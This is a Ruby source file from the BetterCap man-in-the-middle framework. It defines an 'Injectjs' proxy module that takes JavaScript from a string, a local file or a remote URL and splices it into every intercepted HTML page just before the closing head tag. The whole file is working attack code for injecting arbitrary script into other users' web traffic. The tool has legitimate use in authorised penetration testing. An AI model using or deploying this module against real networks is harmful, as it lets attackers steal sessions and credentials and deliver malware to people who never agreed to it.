=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class Injectjs < BetterCap::Proxy::Module
  @@jsdata = nil
  @@jsurl  = nil

  def self.on_options(opts)
    opts.separator ""
    opts.separator "Inject JS Proxy Module Options:"
    opts.separator ""

    opts.on( '--js-data STRING', 'Javascript code to be injected.' ) do |v|
      @@jsdata = v
      unless @@jsdata.include?("<script")
        @@jsdata = "<script type=\"text/javascript\">\n#{@@jsdata}\n</script>"
      end
    end

    opts.on( '--js-file PATH', 'Path of the javascript file to be injected.' ) do |v|
      filename = File.expand_path v
      raise BetterCap::Error, "#{filename} invalid file." unless File.exists?(filename)
      @@jsdata = File.read( filename )
      unless @@jsdata.include?("<script")
        @@jsdata = "<script type=\"text/javascript\">\n#{@@jsdata}\n</script>"
      end
    end

    opts.on( '--js-url URL', 'URL the javascript file to be injected.' ) do |v|
      @@jsurl = v
    end
  end

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      # check command line arguments.
      if @@jsdata.nil? and @@jsurl.nil?
        BetterCap::Logger.warn "No --js-file or --js-url options specified, this proxy module won't work."
      else
        BetterCap::Logger.info "Injecting javascript #{if @@jsdata.nil? then "URL" else "file" end} into http://#{request.host}#{request.url}"
        # inject URL
        if @@jsdata.nil?
          response.body.sub!( '</head>', "<script src=\"#{@@jsurl}\" type=\"text/javascript\"></script></head>" )
        # inject data
        else
          response.body.sub!( '</head>', "#{@@jsdata}</head>" )
        end
      end
    end
  end
end
